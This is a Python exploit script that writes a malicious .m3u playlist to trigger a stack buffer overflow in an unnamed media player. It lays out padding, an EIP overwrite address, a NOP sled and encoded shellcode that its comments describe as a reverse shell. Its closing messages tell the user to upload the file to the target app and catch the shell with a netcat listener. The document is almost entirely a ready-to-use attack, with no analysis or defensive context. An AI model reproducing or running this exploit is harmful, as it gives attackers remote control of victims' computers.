#Setting the file header, top line and the first part of the url that will not be fuzzed
header="#EXTM3U\r\n"
top_line="#EXTINF:123, Sample artist - Sample title\r\n"
url_part1="http://www."

#Configuring the payload to create the fuzzing files
junk1="A"*35069
eip="\x4D\x6D\x19\x78"
junk2="\x43"*16
nops="\x90"*16

#This is the reverse shell
buf =  ""
buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x7d\x93\x18\xf0\x83\xee\xfc\xe2\xf4\x81\x7b"
buf += "\x9a\xf0\x7d\x93\x78\x79\x98\xa2\xd8\x94\xf6\xc3\x28"
buf += "\x7b\x2f\x9f\x93\xa2\x69\x18\x6a\xd8\x72\x24\x52\xd6"
buf += "\x4c\x6c\xb4\xcc\x1c\xef\x1a\xdc\x5d\x52\xd7\xfd\x7c"
buf += "\x54\xfa\x02\x2f\xc4\x93\xa2\x6d\x18\x52\xcc\xf6\xdf"
buf += "\x09\x88\x9e\xdb\x19\x21\x2c\x18\x41\xd0\x7c\x40\x93"
buf += "\xb9\x65\x70\x22\xb9\xf6\xa7\x93\xf1\xab\xa2\xe7\x5c"
buf += "\xbc\x5c\x15\xf1\xba\xab\xf8\x85\x8b\x90\x65\x08\x46"
buf += "\xee\x3c\x85\x99\xcb\x93\xa8\x59\x92\xcb\x96\xf6\x9f"
buf += "\x53\x7b\x25\x8f\x19\x23\xf6\x97\x93\xf1\xad\x1a\x5c"
buf += "\xd4\x59\xc8\x43\x91\x24\xc9\x49\x0f\x9d\xcc\x47\xaa"
buf += "\xf6\x81\xf3\x7d\x20\xfb\x2b\xc2\x7d\x93\x70\x87\x0e"
buf += "\xa1\x47\xa4\x15\xdf\x6f\xd6\x7a\x6c\xcd\x48\xed\x92"
buf += "\x18\xf0\x54\x57\x4c\xa0\x15\xba\x98\x9b\x7d\x6c\xcd"
buf += "\xa0\x2d\xc3\x48\xb0\x2d\xd3\x48\x98\x97\x9c\xc7\x10"
buf += "\x82\x46\x8f\x9a\x78\xfb\xd8\x58\x45\x92\x70\xf2\x7d"
buf += "\x8c\x89\x79\x9b\xf9\x08\xa6\x2a\xfb\x81\x55\x09\xf2"
buf += "\xe7\x25\xf8\x53\x6c\xfc\x82\xdd\x10\x85\x91\xfb\xe8"
buf += "\x45\xdf\xc5\xe7\x25\x15\xf0\x75\x94\x7d\x1a\xfb\xa7"
buf += "\x2a\xc4\x29\x06\x17\x81\x41\xa6\x9f\x6e\x7e\x37\x39"
buf += "\xb7\x24\xf1\x7c\x1e\x5c\xd4\x6d\x55\x18\xb4\x29\xc3"
buf += "\x4e\xa6\x2b\xd5\x4e\xbe\x2b\xc5\x4b\xa6\x15\xea\xd4"
buf += "\xcf\xfb\x6c\xcd\x79\x9d\xdd\x4e\xb6\x82\xa3\x70\xf8"
buf += "\xfa\x8e\x78\x0f\xa8\x28\xe8\x45\xdf\xc5\x70\x56\xe8"
buf += "\x2e\x85\x0f\xa8\xaf\x1e\x8c\x77\x13\xe3\x10\x08\x96"
buf += "\xa3\xb7\x6e\xe1\x77\x9a\x7d\xc0\xe7\x25"

payload=junk1+eip+nops+buf+junk2
url_part2=".com/test.m3u"

#this will create an m3u file that we will upload to the application
try:
	exploit_file=open("m3u_reverse_file.m3u","w")
	exploit_file.write(header+top_line+url_part1+payload+url_part2)
except Exception as error:
	print ("[!]Could not create file")

#upon successful connection
print("[+]Exploit successful")
print("[+]An m3u file has been created: m3u_reverse_file.m3u")
print("[+] Upload this m3u file to the app to exploit")
print("[+]You can then connect to the target machine by setting up a listener on your attack machine")
print ("[+]Example: nc -lvp 8081")